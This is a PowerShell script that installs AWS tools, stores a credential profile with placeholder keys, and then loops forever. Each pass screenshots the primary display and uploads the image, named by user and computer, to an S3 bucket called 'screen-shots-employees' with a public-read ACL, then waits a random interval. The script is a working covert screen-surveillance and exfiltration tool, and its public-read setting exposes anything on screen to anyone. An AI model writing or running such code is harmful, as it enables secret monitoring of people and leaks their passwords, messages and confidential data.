 if (Get-Module -ListAvailable -Name AWS.Tools.Installer){
    Write-Host "Module exists"
}
else {
    Install-Module -Name AWS.Tools.Installer -Force
    Install-AWSToolsModule AWS.Tools.EC2,AWS.Tools.S3 -CleanUp -Force
    Install-AWSToolsModule AWS.Tools.IdentityManagement -Scope AllUsers
}

Set-AWSCredential -StoreAs screencheck_1 -AccessKey Accesskeygoeshere -SecretKey SecretKeyGoesHere
Initialize-AWSDefaultConfiguration -ProfileName screencheck_1 -Region us-west-2


Add-Type -AssemblyName System.Windows.Forms
[Reflection.Assembly]::LoadWithPartialName("System.Drawing")
function screenshot([Drawing.Rectangle]$bounds, $path) {
   $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height
   $graphics = [Drawing.Graphics]::FromImage($bmp)

   $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)

   $bmp.Save($path)

   $graphics.Dispose()
   $bmp.Dispose()
}

function Get-ScreenResolution {            
 $Screens = [system.windows.forms.screen]::AllScreens                        
 foreach ($Screen in $Screens) {            
  $DeviceName = $Screen.DeviceName            
  $Width  = $Screen.Bounds.Width            
  $Height  = $Screen.Bounds.Height            
  $IsPrimary = $Screen.Primary                        
  $OutputObj = New-Object -TypeName PSobject            
  $OutputObj | Add-Member -MemberType NoteProperty -Name DeviceName -Value $DeviceName            
  $OutputObj | Add-Member -MemberType NoteProperty -Name Width -Value $Width            
  $OutputObj | Add-Member -MemberType NoteProperty -Name Height -Value $Height            
  $OutputObj | Add-Member -MemberType NoteProperty -Name IsPrimaryMonitor -Value $IsPrimary            
  $OutputObj                        
 }            
}      

While($True){

    if(!($width -and $height)) {            
        $screen = Get-ScreenResolution | ? {$_.IsPrimaryMonitor -eq $true}            
        $Width = $screen.Width            
        $Height = $screen.height            
    }    
    $datestamp = "{0:HHmmssddMMyyyy}" -f (get-date)
    $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, $width, $height)
    Write-Host "$($env:UserName)_$($env:COMPUTERNAME)_screen_$($datestamp).jpg"
    screenshot $bounds "$($env:UserName)_$($env:COMPUTERNAME)_screen_$($datestamp).jpg"

    $filename = "$($env:UserName)_$($env:COMPUTERNAME)_screen_$($datestamp).jpg"
    $key_info = "$($s3Folder)/$($filename)"
    Write-S3Object -BucketName screen-shots-employees -File $filename -Key $key_info -CannedACLName public-read
    $holdtime = Get-Random -Minimum 15 -Maximum 300
    Remove-Item -Path $filename -Force
    Start-Sleep $holdtime
} 
